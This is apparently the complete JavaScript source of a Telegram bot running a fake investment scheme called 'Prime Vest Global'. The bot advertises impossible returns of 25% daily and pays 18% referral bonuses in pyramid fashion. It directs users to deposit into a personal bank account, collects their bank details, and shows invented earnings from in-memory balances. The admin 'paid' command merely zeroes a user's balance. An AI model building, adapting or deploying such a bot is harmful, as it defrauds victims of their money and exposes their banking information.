const { Telegraf, Markup } = require("telegraf");

const bot = new Telegraf(process.env.TOKEN);

// 🔐 CONFIG
const ADMIN_ID = process.env.ADMIN_ID;
const CHANNEL = "@starfordfreenumbers";
const GROUP = "@primevestglobalinvestments";
const BOT_USERNAME = "Primevestglobal_bot";

// 📦 PACKAGES
const packages = [3000,5000,10000,15000,20000,25000,40000,50000];

// 🧠 DATABASE
let users = {};
let pendingDeposits = {};
let pendingWithdrawals = {};
let waitingBank = {};

// 👤 USER
function getUser(id){
  if(!users[id]){
    users[id] = {
      balance: 500,
      deposited: 0,
      invested: 0,
      plan: 0,
      start: null,
      refBy: null,
      referralEarnings: 0,
      bank: null
    };
  }
  return users[id];
}

// 🚫 FORCE JOIN
async function checkJoin(ctx){
  try{
    let ch = await ctx.telegram.getChatMember(CHANNEL, ctx.from.id);
    let gr = await ctx.telegram.getChatMember(GROUP, ctx.from.id);

    if(ch.status === "left" || gr.status === "left"){
      ctx.reply(`🚫 Join first:\n${CHANNEL}\n${GROUP}`);
      return false;
    }
    return true;
  }catch{
    return true;
  }
}

// 📊 MAIN MENU
function mainMenu(){
  return Markup.keyboard([
    ["💼 Invest","💰 Balance"],
    ["📤 Withdraw","💳 Deposit"],
    ["🏦 Add Bank","👥 Referral"],
    ["📜 History"]
  ]).resize();
}

// 🔙 BACK BUTTON
function backBtn(){
  return Markup.keyboard([["🔙 Back"]]).resize();
}

// 🔙 HANDLE BACK
bot.hears("🔙 Back",(ctx)=>{
  ctx.reply("🏠 Main Menu", mainMenu());
});

// 🚀 START
bot.start(async (ctx)=>{
  if(!(await checkJoin(ctx))) return;

  let id = ctx.from.id;
  let user = getUser(id);

  let ref = ctx.message.text.split(" ")[1];
  if(ref && ref != id && !user.refBy){
    user.refBy = ref;
  }

  ctx.reply(`🔥 *WELCOME TO PRIME VEST GLOBAL* 🔥

💰 Turn ₦3,000 into ₦45,000 in 60 Days!

🚀 Earn *25% DAILY*
👥 Earn *18% referral bonus*

🎁 ₦500 bonus added!

━━━━━━━━━━━━━━━
✅ Fast withdrawals  
✅ Daily passive income  
✅ Trusted system  
━━━━━━━━━━━━━━━

📢 Join:
${CHANNEL}
${GROUP}

👇 Start earning now!`,
  { parse_mode:"Markdown", ...mainMenu() });
});

// 💳 DEPOSIT
bot.hears("💳 Deposit",(ctx)=>{
  const rows = packages.map(p=>[Markup.button.callback(`₦${p}`,`dep_${p}`)]);
  ctx.reply("💳 Choose Deposit:", Markup.inlineKeyboard(rows));
});

bot.action(/dep_(.+)/, async (ctx)=>{
  await ctx.answerCbQuery();
  let amt = parseInt(ctx.match[1]);
  pendingDeposits[ctx.from.id] = amt;

  ctx.reply(`💳 Deposit ₦${amt}

Bank: Moniepoint
Acct: 5075903950
Name: Kamsi

📸 Send screenshot`, backBtn());
});

// 📸 SCREENSHOT
bot.on("photo",(ctx)=>{
  let id = ctx.from.id;
  let file = ctx.message.photo.pop().file_id;

  bot.telegram.sendPhoto(ADMIN_ID, file,{
    caption:`Deposit ₦${pendingDeposits[id]}\nUser:${id}\n/approve_${id}`
  });

  ctx.reply("⏳ Waiting for approval...", backBtn());
});

// ✅ APPROVE + 18%
bot.command(/approve_(.+)/,(ctx)=>{
  if(ctx.from.id != ADMIN_ID) return;

  let id = ctx.match[1];
  let user = getUser(id);
  let amt = pendingDeposits[id] || 0;

  user.balance += amt;
  user.deposited += amt;

  if(user.refBy){
    let refUser = getUser(user.refBy);
    let bonus = amt * 0.18;
    refUser.balance += bonus;
    refUser.referralEarnings += bonus;
  }

  bot.telegram.sendMessage(id, `✅ Deposit approved ₦${amt}`);
  ctx.reply("Approved");
});

// 💼 INVEST
bot.hears("💼 Invest",(ctx)=>{
  const rows = packages.map(p=>[Markup.button.callback(`₦${p}`,`inv_${p}`)]);
  ctx.reply("📊 Choose Investment:", Markup.inlineKeyboard(rows));
});

bot.action(/inv_(.+)/, async (ctx)=>{
  await ctx.answerCbQuery();

  let amt = parseInt(ctx.match[1]);
  let u = getUser(ctx.from.id);

  if(u.balance < amt) return ctx.reply("❌ Not enough balance");

  u.balance -= amt;
  u.invested = amt;
  u.plan = amt;
  u.start = Date.now();

  let daily = amt * 0.25;
  let total = daily * 60;

  ctx.reply(`✅ Investment Started

💰 ₦${amt}
📈 Daily: ₦${daily}
📊 60 Days: ₦${total}`, backBtn());
});

// 💰 PRO DASHBOARD (UPDATED)
bot.hears("💰 Balance",(ctx)=>{
  let u = getUser(ctx.from.id);

  let days = 0;
  let earned = 0;

  if(u.start){
    days = Math.floor((Date.now()-u.start)/86400000);
    if(days > 60) days = 60;
    earned = u.plan * 0.25 * days;
  }

  let daily = u.plan ? u.plan * 0.25 : 0;
  let total = daily * 60;

  ctx.reply(`💎 *YOUR ACCOUNT DASHBOARD*

━━━━━━━━━━━━━━━
💰 *Wallet:* ₦${u.balance}
📥 *Deposited:* ₦${u.deposited}
📊 *Investment:* ₦${u.invested}

📈 *Daily Profit:* ₦${daily}
💵 *Earned:* ₦${earned}
🎯 *60 Days Target:* ₦${total}

⏳ *Progress:* ${days}/60 Days
━━━━━━━━━━━━━━━

🔥 Keep earning daily!`,
  { parse_mode:"Markdown", ...backBtn() });
});

// 🏦 ADD BANK
bot.hears("🏦 Add Bank",(ctx)=>{
  waitingBank[ctx.from.id] = true;
  ctx.reply("Send your bank details:\nName / Bank / Account Number", backBtn());
});

bot.on("text",(ctx)=>{
  if(waitingBank[ctx.from.id]){
    let u = getUser(ctx.from.id);
    u.bank = ctx.message.text;
    delete waitingBank[ctx.from.id];
    return ctx.reply("✅ Bank saved!", backBtn());
  }
});

// 📤 WITHDRAW
bot.hears("📤 Withdraw",(ctx)=>{
  let u = getUser(ctx.from.id);

  if(!u.bank) return ctx.reply("⚠️ Add bank first", backBtn());
  if(u.invested <= 0) return ctx.reply("⚠️ Invest first", backBtn());

  let total = u.balance;
  pendingWithdrawals[ctx.from.id] = total;

  bot.telegram.sendMessage(ADMIN_ID,
`💸 Withdrawal

User:${ctx.from.id}
Amount:₦${total}

Bank:
${u.bank}

/paid_${ctx.from.id}`);

  ctx.reply("⏳ Pending approval...", backBtn());
});

// ADMIN PAY
bot.command(/paid_(.+)/,(ctx)=>{
  if(ctx.from.id != ADMIN_ID) return;

  let id = ctx.match[1];
  let u = getUser(id);

  u.balance = 0;

  bot.telegram.sendMessage(id,"✅ Withdrawal successful");
  ctx.reply("Paid");
});

// 👥 REFERRAL
bot.hears("👥 Referral",(ctx)=>{
  ctx.reply(`👥 Your link:
https://t.me/${BOT_USERNAME}?start=${ctx.from.id}

💰 Earn 18% per deposit`, backBtn());
});

// 📜 HISTORY
bot.hears("📜 History",(ctx)=>{
  let u = getUser(ctx.from.id);

  ctx.reply(`📜 Account

💰 Balance: ₦${u.balance}
📊 Invested: ₦${u.invested}
👥 Referral: ₦${u.referralEarnings}`, backBtn());
});

// 🚀 RUN
bot.launch();
console.log("🔥 FINAL TOP TIER BOT RUNNING");
